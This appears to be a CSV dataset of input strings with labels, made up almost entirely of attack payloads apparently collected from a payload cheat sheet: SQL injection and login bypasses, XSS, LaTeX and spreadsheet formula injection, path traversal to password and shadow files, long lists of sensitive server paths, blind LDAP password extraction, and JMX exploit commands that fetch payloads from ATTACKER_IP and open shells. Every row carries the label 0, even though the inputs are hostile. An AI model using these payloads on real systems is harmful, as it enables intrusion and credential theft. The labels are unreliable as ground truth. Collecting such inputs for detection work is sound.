input,label
SLEEP(5)=',0
or SLEEP(5),0
or SLEEP(5)#,0
or SLEEP(5)--,0
"or SLEEP(5)=""",0
or SLEEP(5)=',0
waitfor delay '00:00:05',0
waitfor delay '00:00:05'--,0
waitfor delay '00:00:05'#,0
pg_SLEEP(5),0
pg_SLEEP(5)--,0
pg_SLEEP(5)#,0
or pg_SLEEP(5),0
or pg_SLEEP(5)--,0
or pg_SLEEP(5)#,0
"'\""",0
AnD SLEEP(5),0
AnD SLEEP(5)--,0
AnD SLEEP(5)#,0
&&SLEEP(5),0
&&SLEEP(5)--,0
&&SLEEP(5)#,0
' AnD SLEEP(5) ANd '1,0
'&&SLEEP(5)&&'1,0
ORDER BY SLEEP(5),0
ORDER BY SLEEP(5)--,0
ORDER BY SLEEP(5)#,0
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),0
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,0
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,0
+benchmark(3,0
+ SLEEP(10) + ',0
RANDOMBLOB(500000000/2),0
RANDOMBLOB(1000000000/2),0
'-',0
' ',0
'&',0
'^',0
'*',0
' or ''-',0
' or '' ',0
' or ''&',0
' or ''^',0
' or ''*',0
-,0
 ,0
&,0
^,0
*,0
" or ""-",0
" or "" ",0
" or ""&",0
" or ""^",0
" or ""*",0
or true--,0
" or true--
' or true--
) or true--",0
') or true--,0
' or 'x'='x,0
') or ('x')=('x,0
')) or (('x'))=(('x,0
" or x""=""x",0
") or (x"")=(""x",0
")) or ((x""))=((""x",0
or 1=1,0
or 1=1--,0
or 1=1#,0
or 1=1/*,0
admin' --,0
admin' #,0
admin'/*,0
admin' or '1'='1,0
admin' or '1'='1'--,0
admin' or '1'='1'#,0
admin' or '1'='1'/*,0
admin'or 1=1 or ''=',0
admin' or 1=1,0
admin' or 1=1--,0
admin' or 1=1#,0
admin' or 1=1/*,0
admin') or ('1'='1,0
admin') or ('1'='1'--,0
admin') or ('1'='1'#,0
admin') or ('1'='1'/*,0
admin') or '1'='1,0
admin') or '1'='1'--,0
admin') or '1'='1'#,0
admin') or '1'='1'/*,0
1234 ' AND 1=0 UNION ALL SELECT 'admin',0
"admin"" --",0
"admin"" #",0
"admin""/*",0
"admin"" or ""1""=""1",0
"admin"" or ""1""=""1""--",0
"admin"" or ""1""=""1""#",0
"admin"" or ""1""=""1""/*",0
"admin""or 1=1 or """"=""",0
"admin"" or 1=1",0
"admin"" or 1=1--",0
"admin"" or 1=1#",0
"admin"" or 1=1/*",0
"admin"") or (""1""=""1",0
"admin"") or (""1""=""1""--",0
"admin"") or (""1""=""1""#",0
"admin"") or (""1""=""1""/*",0
"admin"") or ""1""=""1",0
"admin"") or ""1""=""1""--",0
"admin"") or ""1""=""1""#",0
"admin"") or ""1""=""1""/*",0
"document.body.style.background = ""red"";",0
"alert(""Vulnerable to XSS"");",0
password123,0
Lorem Ipsum is simpl,0
orem Ipsum has been the ,0
Ralph White,0
ralph.white@example.com,0
5/7/1998,0
2343 Timber Wolf Trail,0
jenny,0
(223) 814-7243,0
"gender: ""female""",0
/v1/explorer,0
/v1/graphiql,0
/graph,0
/graphql,0
/graphql/console/,0
/graphql.php,0
/graphiql,0
/graphiql.php,0
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000,0
"jython sjet.py TARGET_IP TARGET_PORT super_secret command ""ls -la""",0
jython sjet.py TARGET_IP TARGET_PORT super_secret shell,0
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password,0
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall,0
"jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 ""touch /tmp/xxx""",0
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000,0
"jython mjet.py TARGET_IP TARGET_PORT command super_secret ""whoami""",0
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell,0
use exploit/multi/misc/java_rmi_server,0
set RHOSTS <IPs>,0
set RPORT <PORT>,0
# configure also the payload if needed,0
run,0
(&(sn=administrator)(password=*))    : OK,0
(&(sn=administrator)(password=A*))   : KO,0
(&(sn=administrator)(password=B*))   : KO,0
...,0
(&(sn=administrator)(password=M*))   : OK,0
(&(sn=administrator)(password=MA*))  : KO,0
(&(sn=administrator)(password=MB*))  : KO,0
...,0
(&(sn=administrator)(password=MY*))  : OK,0
(&(sn=administrator)(password=MYA*)) : KO,0
(&(sn=administrator)(password=MYB*)) : KO,0
(&(sn=administrator)(password=MYC*)) : KO,0
...,0
(&(sn=administrator)(password=MYK*)) : OK,0
(&(sn=administrator)(password=MYKE)) : OK,0
userPassword,0
surname,0
name,0
cn,0
sn,0
objectClass,0
mail,0
givenName,0
commonName,0
\input{/etc/passwd},0
\include{somefile} # load .tex file (somefile.tex),0
\newread\file,0
\openin\file=/etc/issue,0
\read\file to\line,0
\text{\line},0
\closein\file,0
\lstinputlisting{/etc/passwd},0
\newread\file,0
\openin\file=/etc/passwd,0
\loop\unless\ifeof\file,0
\read\file to\fileline,0
\text{\fileline},0
\repeat,0
\closein\file,0
\newwrite\outfile,0
\openout\outfile=cmd.tex,0
\write\outfile{Hello-world},0
\write\outfile{Line 2},0
\write\outfile{I like trains},0
\closeout\outfile,0
"DDE (""cmd"";""/C calc"";""!A0"")A0",0
@SUM(1+1)*cmd|' /C calc'!A0,0
=2+5+cmd|' /C calc'!A0,0
=cmd|' /C calc'!'A1',0
cat /etc/passwd,0
root:x:0:0:root:/root:/bin/bash,0
daemon:x:1:1:daemon:/usr/sbin:/bin/sh,0
bin:x:2:2:bin:/bin:/bin/sh,0
sys:x:3:3:sys:/dev:/bin/sh,0
"swissky@crashlab:~$ echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""",0
/etc/passwd,0
"swissky@crashlab:~$ cat `echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",0
root:x:0:0:root:/root:/bin/bash,0
swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc,0
root:x:0:0:root:/root:/bin/bash,0
swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`,0
root:x:0:0:root:/root:/bin/bash,0
swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764,0
/etc/passwd,0
swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`,0
root:x:0:0:root:/root:/bin/bash,0
swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764),0
/etc/passwd,0
swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`,0
root:x:0:0:root:/root:/bin/bash,0
/./../boot.ini,0
/./.././../boot.ini,0
/./.././.././../boot.ini,0
/./.././.././.././../boot.ini,0
/./.././.././.././.././../boot.ini,0
/./.././.././.././.././.././../boot.ini,0
/./.././.././.././.././.././.././../boot.ini,0
/./.././.././.././.././.././.././.././../boot.ini,0
/.\..\boot.ini,0
/.\..\.\..\boot.ini,0
/.\..\.\..\.\..\boot.ini,0
/.\..\.\..\.\..\.\..\boot.ini,0
/.\..\.\..\.\..\.\..\.\..\boot.ini,0
/.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,0
/.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,0
/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini,0
/.//..//boot.ini,0
/.//..//.//..//boot.ini,0
/.//..//.//..//.//..//boot.ini,0
/.//..//.//..//.//..//.//..//boot.ini,0
/.//..//.//..//.//..//.//..//.//..//boot.ini,0
/.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,0
/.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,0
/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini,0
/.\\..\\boot.ini,0
/.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,0
/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini,0
/../boot.ini,0
/../..//boot.ini,0
/../..//../boot.ini,0
/../..//../..//boot.ini,0
/../..//../..//../boot.ini,0
/../..//../..//../..//boot.ini,0
/../..//../..//../..//../boot.ini,0
/../..//../..//../..//../..//boot.ini,0
/..\boot.ini,0
/..\..\\boot.ini,0
/..\..\\..\boot.ini,0
/..\..\\..\..\\boot.ini,0
/..\..\\..\..\\..\boot.ini,0
/..\..\\..\..\\..\..\\boot.ini,0
/..\..\\..\..\\..\..\\..\boot.ini,0
/..\..\\..\..\\..\..\\..\..\\boot.ini,0
/..///boot.ini,0
/../..///boot.ini,0
/../..//..///boot.ini,0
/../..//../..///boot.ini,0
/../..//../..//..///boot.ini,0
/../..//../..//../..///boot.ini,0
/../..//../..//../..//..///boot.ini,0
/../..//../..//../..//../..///boot.ini,0
/..\\\boot.ini,0
/..\..\\\boot.ini,0
/..\..\\..\\\boot.ini,0
/..\..\\..\..\\\boot.ini,0
/..\..\\..\..\\..\\\boot.ini,0
/..\..\\..\..\\..\..\\\boot.ini,0
/..\..\\..\..\\..\..\\..\\\boot.ini,0
/..\..\\..\..\\..\..\\..\..\\\boot.ini,0
C:\WINDOWS\win.ini../../../../../../../../../../../../etc/hosts%00,0
../../../../../../../../../../../../etc/hosts,0
../../boot.ini,0
/../../../../../../../../%2A,0
../../../../../../../../../../../../etc/passwd%00,0
../../../../../../../../../../../../etc/passwd,0
../../../../../../../../../../../../etc/shadow%00,0
../../../../../../../../../../../../etc/shadow,0
/../../../../../../../../../../etc/passwd^^,0
/../../../../../../../../../../etc/shadow^^,0
/../../../../../../../../../../etc/passwd,0
/../../../../../../../../../../etc/shadow,0
/./././././././././././etc/passwd,0
/./././././././././././etc/shadow,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,0
/..\../..\../..\../..\../..\../..\../etc/passwd,0
/..\../..\../..\../..\../..\../..\../etc/shadow,0
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,0
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,0
%0a/bin/cat%20/etc/passwd,0
%0a/bin/cat%20/etc/shadow,0
%00/etc/passwd%00,0
%00/etc/shadow%00,0
%00../../../../../../etc/passwd,0
%00../../../../../../etc/shadow,0
/../../../../../../../../../../../etc/passwd%00.jpg,0
/../../../../../../../../../../../etc/passwd%00.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,0
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini,0
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,0
\\&apos;/bin/cat%20/etc/passwd\\&apos;,0
\\&apos;/bin/cat%20/etc/shadow\\&apos;,0
../../../../../../../../conf/server.xml,0
/../../../../../../../../bin/id|,0
C:/inetpub/wwwroot/global.asa,0
C:\inetpub\wwwroot\global.asa,0
C:/boot.ini,0
C:\boot.ini,0
../../../../../../../../../../../../localstart.asp%00,0
../../../../../../../../../../../../localstart.asp,0
../../../../../../../../../../../../boot.ini%00,0
../../../../../../../../../../../../boot.ini,0
/./././././././././././boot.ini,0
/../../../../../../../../../../../boot.ini%00,0
/../../../../../../../../../../../boot.ini,0
/..\../..\../..\../..\../..\../..\../boot.ini,0
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,0
\..\..\..\..\..\..\..\..\..\..\boot.ini,0
..\..\..\..\..\..\..\..\..\..\boot.ini%00,0
..\..\..\..\..\..\..\..\..\..\boot.ini,0
/../../../../../../../../../../../boot.ini%00.html,0
/../../../../../../../../../../../boot.ini%00.jpg,0
/.../.../.../.../.../,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,0
/..././..././..././..././..././..././..././..././boot.ini,0
/..././..././..././..././..././..././..././..././boot.ini%00,0
/..././..././..././..././..././..././..././..././etc/passwd,0
/..././..././..././..././..././..././..././..././etc/passwd%00,0
/apache/logs/error.log ,0
/apache/logs/access.log ,0
/apache/logs/error.log ,0
/apache/logs/access.log ,0
/apache/logs/error.log ,0
/apache/logs/access.log ,0
/etc/httpd/logs/acces_log ,0
/etc/httpd/logs/acces.log ,0
/etc/httpd/logs/error_log ,0
/etc/httpd/logs/error.log ,0
/var/www/logs/access_log ,0
/var/www/logs/access.log ,0
/usr/local/apache/logs/access_log ,0
/usr/local/apache/logs/access.log ,0
/var/log/apache/access_log ,0
/var/log/apache2/access_log ,0
/var/log/apache/access.log ,0
/var/log/apache2/access.log ,0
/var/log/access_log ,0
/var/log/access.log ,0
/var/www/logs/error_log ,0
/var/www/logs/error.log ,0
/usr/local/apache/logs/error_log ,0
/usr/local/apache/logs/error.log ,0
/var/log/apache/error_log ,0
/var/log/apache2/error_log ,0
/var/log/apache/error.log ,0
/var/log/apache2/error.log ,0
/var/log/error_log ,0
/var/log/error.log ,0
/..\..\\..\..\\..\..\\..\..\\\/etc/passwd,0
/etc/shadow,0
/etc/shadow~,0
/etc/hosts,0
/etc/motd,0
/etc/apache/apache.conf,0
/etc/fstab,0
/etc/apache2/apache2.conf,0
/etc/apache/httpd.conf,0
/etc/httpd/conf/httpd.conf,0
/etc/apache2/httpd.conf,0
/etc/apache2/sites-available/default,0
/etc/mysql/my.cnf,0
/etc/my.cnf,0
/etc/sysconfig/network-scripts/ifcfg-eth0,0
/etc/redhat-release,0
/etc/httpd/conf.d/php.conf,0
/etc/pam.d/proftpd,0
/etc/phpmyadmin/config.inc.php,0
/var/www/config.php,0
/etc/httpd/logs/error_log,0
/etc/httpd/logs/error.log,0
/etc/httpd/logs/access_log,0
/etc/httpd/logs/access.log,0
/var/log/apache/error_log,0
/var/log/apache/error.log,0
/var/log/apache/access_log,0
/var/log/apache/access.log,0
/var/log/apache2/error_log,0
/var/log/apache2/error.log,0
/var/log/apache2/access_log,0
/var/log/apache2/access.log,0
/var/www/logs/error_log,0
/var/www/logs/error.log,0
/var/www/logs/access_log,0
/var/www/logs/access.log,0
/usr/local/apache/logs/error_log,0
/usr/local/apache/logs/error.log,0
/usr/local/apache/logs/access_log,0
/usr/local/apache/logs/access.log,0
/var/log/error_log,0
/var/log/error.log,0
/var/log/access_log,0
/var/log/access.log,0
/etc/group,0
/etc/security/group,0
/etc/security/passwd,0
/etc/security/user,0
/etc/security/environ,0
/etc/security/limits,0
/usr/lib/security/mkuser.default,0
/apache/logs/access.log,0
/apache/logs/error.log,0
/etc/httpd/logs/acces_log,0
/etc/httpd/logs/acces.log,0
/var/log/httpd/access_log,0
/var/log/httpd/error_log,0
/apache2/logs/error.log,0
/apache2/logs/access.log,0
/logs/error.log,0
/logs/access.log,0
/usr/local/apache2/logs/access_log,0
/usr/local/apache2/logs/access.log,0
/usr/local/apache2/logs/error_log,0
/usr/local/apache2/logs/error.log,0
/var/log/httpd/access.log,0
/var/log/httpd/error.log,0
/opt/lampp/logs/access_log,0
/opt/lampp/logs/error_log,0
/opt/xampp/logs/access_log,0
/opt/xampp/logs/error_log,0
/opt/lampp/logs/access.log,0
/opt/lampp/logs/error.log,0
/opt/xampp/logs/access.log,0
/opt/xampp/logs/error.log,0
C:\ProgramFiles\ApacheGroup\Apache\logs\access.log,0
C:\ProgramFiles\ApacheGroup\Apache\logs\error.log,0
/usr/local/apache/conf/httpd.conf,0
/usr/local/apache2/conf/httpd.conf,0
/etc/apache/conf/httpd.conf,0
/usr/local/etc/apache/conf/httpd.conf,0
/usr/local/apache/httpd.conf,0
/usr/local/apache2/httpd.conf,0
/usr/local/httpd/conf/httpd.conf,0
/usr/local/etc/apache2/conf/httpd.conf,0
/usr/local/etc/httpd/conf/httpd.conf,0
/usr/apache2/conf/httpd.conf,0
/usr/apache/conf/httpd.conf,0
/usr/local/apps/apache2/conf/httpd.conf,0
/usr/local/apps/apache/conf/httpd.conf,0
/etc/apache2/conf/httpd.conf,0
/etc/http/conf/httpd.conf,0
/etc/httpd/httpd.conf,0
/etc/http/httpd.conf,0
/etc/httpd.conf,0
/opt/apache/conf/httpd.conf,0
/opt/apache2/conf/httpd.conf,0
/var/www/conf/httpd.conf,0
/private/etc/httpd/httpd.conf,0
/private/etc/httpd/httpd.conf.default,0
/Volumes/webBackup/opt/apache2/conf/httpd.conf,0
/Volumes/webBackup/private/etc/httpd/httpd.conf,0
/Volumes/webBackup/private/etc/httpd/httpd.conf.default,0
C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf,0
C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf,0
C:\ProgramFiles\xampp\apache\conf\httpd.conf,0
/usr/local/php/httpd.conf.php,0
/usr/local/php4/httpd.conf.php,0
/usr/local/php5/httpd.conf.php,0
/usr/local/php/httpd.conf,0
/usr/local/php4/httpd.conf,0
/usr/local/php5/httpd.conf,0
/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf,0
/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf,0
/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf,0
/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php,0
/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php,0
/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php,0
/usr/local/etc/apache/vhosts.conf,0
/etc/php.ini,0
/bin/php.ini,0
/etc/httpd/php.ini,0
/usr/lib/php.ini,0
/usr/lib/php/php.ini,0
/usr/local/etc/php.ini,0
/usr/local/lib/php.ini,0
/usr/local/php/lib/php.ini,0
/usr/local/php4/lib/php.ini,0
/usr/local/php5/lib/php.ini,0
/usr/local/apache/conf/php.ini,0
/etc/php4.4/fcgi/php.ini,0
/etc/php4/apache/php.ini,0
/etc/php4/apache2/php.ini,0
/etc/php5/apache/php.ini,0
/etc/php5/apache2/php.ini,0
/etc/php/php.ini,0
/etc/php/php4/php.ini,0
/etc/php/apache/php.ini,0
/etc/php/apache2/php.ini,0
/web/conf/php.ini,0
/usr/local/Zend/etc/php.ini,0
/opt/xampp/etc/php.ini,0
/var/local/www/conf/php.ini,0
/etc/php/cgi/php.ini,0
/etc/php4/cgi/php.ini,0
/etc/php5/cgi/php.ini,0
c:\php5\php.ini,0
c:\php4\php.ini,0
c:\php\php.ini,0
c:\PHP\php.ini,0
c:\WINDOWS\php.ini,0
c:\WINNT\php.ini,0
c:\apache\php\php.ini,0
c:\xampp\apache\bin\php.ini,0
c:\NetServer\bin\stable\apache\php.ini,0
c:\home2\bin\stable\apache\php.ini,0
c:\home\bin\stable\apache\php.ini,0
/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini,0
/usr/local/cpanel/logs,0
/usr/local/cpanel/logs/stats_log,0
/usr/local/cpanel/logs/access_log,0
/usr/local/cpanel/logs/error_log,0
/usr/local/cpanel/logs/license_log,0
/usr/local/cpanel/logs/login_log,0
/var/cpanel/cpanel.config,0
/var/log/mysql/mysql-bin.log,0
/var/log/mysql.log,0
/var/log/mysqlderror.log,0
/var/log/mysql/mysql.log,0
/var/log/mysql/mysql-slow.log,0
/var/mysql.log,0
/var/lib/mysql/my.cnf,0
C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err,0
C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log,0
C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err,0
C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log,0
C:\ProgramFiles\MySQL\data\hostname.err,0
C:\ProgramFiles\MySQL\data\mysql.log,0
C:\ProgramFiles\MySQL\data\mysql.err,0
C:\ProgramFiles\MySQL\data\mysql-bin.log,0
C:\MySQL\data\hostname.err,0
C:\MySQL\data\mysql.log,0
C:\MySQL\data\mysql.err,0
C:\MySQL\data\mysql-bin.log,0
C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini,0
C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf,0
C:\ProgramFiles\MySQL\my.ini,0
C:\ProgramFiles\MySQL\my.cnf,0
C:\MySQL\my.ini,0
C:\MySQL\my.cnf,0
/etc/logrotate.d/proftpd,0
/www/logs/proftpd.system.log,0
/var/log/proftpd,0
/etc/proftp.conf,0
/etc/protpd/proftpd.conf,0
/etc/vhcs2/proftpd/proftpd.conf,0
/etc/proftpd/modules.conf,0
/var/log/vsftpd.log,0
/etc/vsftpd.chroot_list,0
/etc/logrotate.d/vsftpd.log,0
/etc/vsftpd/vsftpd.conf,0
/etc/vsftpd.conf,0
/etc/chrootUsers,0
/var/log/xferlog,0
/var/adm/log/xferlog,0
/etc/wu-ftpd/ftpaccess,0
/etc/wu-ftpd/ftphosts,0
/etc/wu-ftpd/ftpusers,0
/usr/sbin/pure-config.pl,0
/usr/etc/pure-ftpd.conf,0
/etc/pure-ftpd/pure-ftpd.conf,0
/usr/local/etc/pure-ftpd.conf,0
/usr/local/etc/pureftpd.pdb,0
/usr/local/pureftpd/etc/pureftpd.pdb,0
/usr/local/pureftpd/sbin/pure-config.pl,0
/usr/local/pureftpd/etc/pure-ftpd.conf,0
/etc/pure-ftpd/pure-ftpd.pdb,0
/etc/pureftpd.pdb,0
/etc/pureftpd.passwd,0
/etc/pure-ftpd/pureftpd.pdb,0
/var/log/pure-ftpd/pure-ftpd.log,0
/logs/pure-ftpd.log,0
/var/log/pureftpd.log,0
/var/log/ftp-proxy/ftp-proxy.log,0
/var/log/ftp-proxy,0
/var/log/ftplog,0
/etc/logrotate.d/ftp,0
/etc/ftpchroot,0
/etc/ftphosts,0
/var/log/exim_mainlog,0
/var/log/exim/mainlog,0
/var/log/maillog,0
/var/log/exim_paniclog,0
/var/log/exim/paniclog,0
/var/log/exim/rejectlog,0
/var/log/exim_rejectlog,0
/proc/self/cmdline,0
/proc/self/stat,0
/proc/self/status,0
/proc/self/fd/0,0
/proc/self/fd/3,0
/proc/self/fd/4,0
/proc/self/fd/5,0
/proc/self/fd/6,0
/proc/self/fd/7,0
/proc/self/fd/8,0
/proc/self/fd/9,0
/proc/self/fd/10,0
/proc/self/fd/11,0
/proc/self/fd/12,0
/proc/self/fd/13,0
/proc/self/fd/14,0
/proc/self/fd/15,0
/etc/passwd,0
/etc/master.passwd,0
/etc/shadow,0
/var/db/shadow/hash,0
/etc/group,0
/etc/hosts,0
/etc/motd,0
/etc/issue,0
/etc/release,0
/etc/redhat-release,0
/etc/crontab,0
/etc/inittab,0
/proc/version,0
/proc/cmdline,0
/proc/self/environ,0
/proc/self/fd/0,0
/proc/self/fd/2,0
/proc/self/fd/255,0
/etc/httpd.conf,0
/etc/apache2.conf,0
/etc/apache2/apache2.conf,0
/etc/apache2/httpd.conf,0
/etc/httpd/conf/httpd.conf,0
/etc/httpd/httpd.conf,0
/etc/apache2/conf/httpd.conf,0
/etc/apache/conf/httpd.conf,0
/usr/local/apache2/conf/httpd.conf,0
/usr/local/apache/conf/httpd.conf,0
/etc/apache2/sites-enabled/000-default,0
/etc/apache2/sites-available/default,0
/etc/nginx.conf,0
/etc/nginx/nginx.conf,0
/etc/nginx/sites-available/default,0
/etc/nginx/sites-enabled/default,0
/etc/ssh/sshd_config,0
/etc/my.cnf,0
/etc/mysql/my.cnf,0
/etc/php.ini,0
/var/mail/www-data,0
/var/mail/www,0
/var/mail/apache,0
/var/mail/nobody,0
/var/www/.bash_history,0
/root/.bash_history,0
/var/root/.bash_history,0
/var/root/.sh_history,0
/usr/local/apache/httpd.conf,0
/usr/local/apache2/httpd.conf,0
/usr/local/httpd/conf/httpd.conf,0
/usr/local/etc/apache/conf/httpd.conf,0
/usr/local/etc/apache2/conf/httpd.conf,0
/usr/local/etc/httpd/conf/httpd.conf,0
/usr/apache2/conf/httpd.conf,0
/usr/apache/conf/httpd.conf,0
/etc/http/conf/httpd.conf,0
/etc/http/httpd.conf,0
/opt/apache/conf/httpd.conf,0
/opt/apache2/conf/httpd.conf,0
/var/www/conf/httpd.conf,0
/usr/local/php/httpd.conf,0
/usr/local/php4/httpd.conf,0
/usr/local/php5/httpd.conf,0
/etc/httpd/php.ini,0
/usr/lib/php.ini,0
/usr/lib/php/php.ini,0
/usr/local/etc/php.ini,0
/usr/local/lib/php.ini,0
/usr/local/php/lib/php.ini,0
/usr/local/php4/lib/php.ini,0
/usr/local/php5/lib/php.ini,0
/usr/local/apache/conf/php.ini,0
/etc/php4/apache/php.ini,0
/etc/php4/apache2/php.ini,0
/etc/php5/apache/php.ini,0
/etc/php5/apache2/php.ini,0
/etc/php/php.ini,0
/etc/php/php4/php.ini,0
/etc/php/apache/php.ini,0
/etc/php/apache2/php.ini,0
/usr/local/Zend/etc/php.ini,0
/opt/xampp/etc/php.ini,0
/var/local/www/conf/php.ini,0
/etc/php/cgi/php.ini,0
/etc/php4/cgi/php.ini,0
/etc/php5/cgi/php.ini,0
/var/log/lastlog,0
/var/log/wtmp,0
/var/run/utmp,0
/var/log/messages.log,0
/var/log/messages,0
/var/log/messages.0,0
/var/log/messages.0.gz,0
/var/log/messages.1,0
/var/log/messages.1.gz,0
/var/log/messages.2,0
/var/log/messages.2.gz,0
/var/log/messages.3,0
/var/log/messages.3.gz,0
/var/log/syslog.log,0
/var/log/syslog,0
/var/log/syslog.0,0
/var/log/syslog.0.gz,0
/var/log/syslog.1,0
/var/log/syslog.1.gz,0
/var/log/syslog.2,0
/var/log/syslog.2.gz,0
/var/log/syslog.3,0
/var/log/syslog.3.gz,0
/var/log/auth.log,0
/var/log/auth.log.0,0
/var/log/auth.log.0.gz,0
/var/log/auth.log.1,0
/var/log/auth.log.1.gz,0
